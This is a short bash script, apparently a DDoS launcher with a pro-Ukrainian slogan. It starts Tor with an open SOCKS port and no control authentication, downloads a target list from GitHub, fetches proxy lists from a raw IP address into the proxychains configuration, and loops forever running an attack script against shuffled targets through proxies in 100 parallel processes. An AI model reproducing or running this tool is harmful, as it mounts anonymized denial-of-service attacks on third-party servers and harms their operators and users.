#!/bin/bash

tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "" --SocksPort 0.0.0.0:9050

echo "российский военній корабль, иди на хуй!"

wget https://github.com/imsamurai/ban/raw/master/data/chechnya_filtered.txt
curl -s "http://143.244.166.15/proxy-fast.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
curl -s "http://143.244.166.15/proxy.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf

while true; do cat "chechnya_filtered.txt" | shuf | xargs -r -P 100 -L1 -d '\n' proxychains -q ./run.sh; done;
